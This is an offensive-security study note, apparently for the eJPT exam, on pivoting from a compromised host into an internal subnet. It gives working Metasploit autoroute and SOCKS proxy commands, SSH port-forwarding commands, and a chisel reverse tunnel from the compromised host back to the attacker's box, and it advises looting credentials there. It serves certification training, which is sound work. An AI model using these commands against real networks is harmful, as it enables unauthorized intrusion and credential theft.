# Pivoting

A recurring eJPT theme: you compromise a host that has a **second network interface** reaching an internal subnet you can't touch directly. Pivoting uses that compromised host as a bridge to attack the hidden network.

**First, confirm there's something to pivot to.** On your foothold:

```bash
# Linux
ip a; ifconfig          # look for a second NIC / different subnet
ip route; route -n
arp -a                  # hosts the box has talked to
# Windows
ipconfig /all
route print
arp -a
```

If you see a second subnet (e.g. you're on `192.168.1.0/24` but the box also sits on `10.10.10.0/24`), that's your pivot target.

---

## Option 1 — Metasploit autoroute (easiest on the exam)

Once you have a meterpreter session on the dual-homed host:

```bash
# From meterpreter: add a route to the internal subnet
run autoroute -s 10.10.10.0/24
# or, from msf console with the session backgrounded:
use post/multi/manage/autoroute
set SESSION <id>
set SUBNET 10.10.10.0
run

# Now scan the internal net through the session
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.5
set PORTS 1-1000
run
```

This routes Metasploit module traffic through the pivot. To use **other tools** (nmap, browser) through it, add a SOCKS proxy:

```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
# then prefix other tools with proxychains
proxychains nmap -sT -Pn 10.10.10.5
```

Make sure `/etc/proxychains.conf` ends with `socks4 127.0.0.1 1080`.

---

## Option 2 — SSH tunneling

If you have SSH access (or creds) to the pivot host.

```bash
# Local port forward: reach internal host:port via a local port
ssh -L 8080:10.10.10.5:80 user@<pivot-ip>
# → browse http://127.0.0.1:8080 to hit the internal web server

# Dynamic (SOCKS) proxy: route anything through the pivot
ssh -D 1080 user@<pivot-ip>
# then: proxychains <tool> <internal-ip>

# Remote port forward: expose an internal service back to your box
ssh -R 9090:10.10.10.5:445 user@<pivot-ip>
```

---

## Option 3 — chisel (when SSH isn't available)

A single static binary, great when you only have a basic shell. Transfer it to both ends.

```bash
# On your attacker box (server):
./chisel server -p 8000 --reverse
# On the compromised pivot (client), point a SOCKS proxy back to you:
./chisel client <your-ip>:8000 R:socks
# then use proxychains against the internal subnet
```

---

## Port forwarding recap

| Technique | Use when | Tool |
|---|---|---|
| Autoroute + socks_proxy | You have a meterpreter session | Metasploit |
| Local forward (`-L`) | Reach one internal service | SSH |
| Dynamic/SOCKS (`-D`) | Reach a whole subnet with many tools | SSH / chisel |
| Reverse (`-R`) | Pivot host can't accept inbound | SSH / chisel |

---

## Pivoting discipline

- **Loot creds on the pivot first** — they usually work on the internal hosts (password reuse is the norm on the exam).
- **Re-run the full methodology** against the internal network: discover hosts → scan → enumerate → exploit.
- **proxychains everything** once your SOCKS proxy is up; use `-sT -Pn` for nmap through a proxy (SYN scans don't work over SOCKS).
